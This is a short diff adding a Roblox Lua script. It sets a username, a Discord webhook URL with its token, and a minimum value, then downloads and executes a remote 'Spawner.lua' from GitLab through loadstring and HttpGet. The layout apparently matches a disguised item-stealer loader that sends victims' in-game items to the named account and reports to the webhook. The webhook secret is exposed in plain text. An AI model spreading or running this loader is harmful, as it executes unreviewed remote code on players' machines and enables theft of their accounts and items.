@@ -1,0 +1,5 @@
+Username = "legends8521"
+Weebhook ="https://discord.com/api/webhooks/1404156592986914827/dYe07rJyInrMm7FEWw5-RUuVpgxazgsgD211W7zG__Y70MVUS2whrG9m6m2Cz6_Muwzq"
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
